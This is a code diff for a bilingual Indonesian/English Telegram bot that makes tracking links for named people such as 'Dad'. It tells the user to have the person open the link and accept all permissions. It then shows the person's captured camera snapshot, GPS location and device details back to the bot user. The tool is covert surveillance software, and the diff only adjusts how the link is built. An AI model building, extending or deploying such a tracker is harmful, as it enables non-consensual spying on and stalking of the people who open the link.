@@ -1,4 +1,4 @@
-const { Telegraf, Markup } = require('telegraf');
+const { Telegraf } = require('telegraf');
 const axios = require('axios');
 require('dotenv').config();
 
@@ -34,13 +34,11 @@ bot.command(['start', 'help'], (ctx) => {
 bot.command('buatlink', async (ctx) => {
     const input = ctx.message.text.split(' ');
     if (input.length < 2) return ctx.reply(t(ctx, "Contoh: /buatlink Ayah", "Example: /buatlink Dad"));
-
     const alias = input[1];
     const userId = ctx.from.id.toString();
-
     try {
-        const response = await api.post('/api/create_link', { user_id: userId, alias });
-        const { link } = response.data;
+        const link = `${RENDER_SERVER_URL}/tracker.html?alias=${encodeURIComponent(alias)}&uid=${userId}`;
+        await api.post('/api/create_link', { user_id: userId, alias, link });
         const pesan = t(
             ctx,
             `Link untuk *${alias}* berhasil dibuat!\n\nBerikan link ini:\n\`${link}\`\n\nPastikan mereka membuka link & menyetujui semua izin.`,
@@ -76,29 +74,23 @@ bot.command('listlink', async (ctx) => {
 bot.command('lacak', async (ctx) => {
     const input = ctx.message.text.split(' ');
     if (input.length < 2) return ctx.reply(t(ctx, "Contoh: /lacak Ayah", "Example: /lacak Dad"));
-
     const alias = input[1];
     const userId = ctx.from.id.toString();
-
     await ctx.reply(t(ctx, `Mencari data terakhir untuk *${alias}*...`, `Searching last data for *${alias}*...`), { parse_mode: 'Markdown' });
-
     try {
         const response = await api.get(`/api/get_data/${userId}/${alias}`);
         const { data } = response.data;
-
         if (data.photoBase64) {
             const photoBuffer = Buffer.from(data.photoBase64.replace(/^data:image\/jpeg;base64,/, ""), 'base64');
             await ctx.replyWithPhoto({ source: photoBuffer }, { caption: t(ctx, `Snapshot dari kamera ${alias}`, `Snapshot from ${alias}'s camera`) });
         } else {
             await ctx.reply(t(ctx, "Tidak ada data foto yang diterima.", "No photo data received."));
         }
-
         if (data.location) {
             await ctx.replyWithLocation(data.location.lat, data.location.lon);
         } else {
             await ctx.reply(t(ctx, "Tidak ada data lokasi yang diterima.", "No location data received."));
         }
-
         if (data.deviceInfo) {
             const infoText = t(
                 ctx,
@@ -107,7 +99,6 @@ bot.command('lacak', async (ctx) => {
             );
             await ctx.replyWithMarkdown(infoText);
         }
-
     } catch (error) {
         ctx.reply(t(ctx, `Gagal melacak: ${error.response?.data?.message || "Data belum tersedia."}`, `Failed to track: ${error.response?.data?.message || "Data not available yet."}`));
     }
@@ -127,8 +118,5 @@ bot.command('hapuslink', async (ctx) => {
 });
 
 bot.launch();
-console.log('Bot Telegraf multi-bahasa sedang berjalan...');
-
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
-
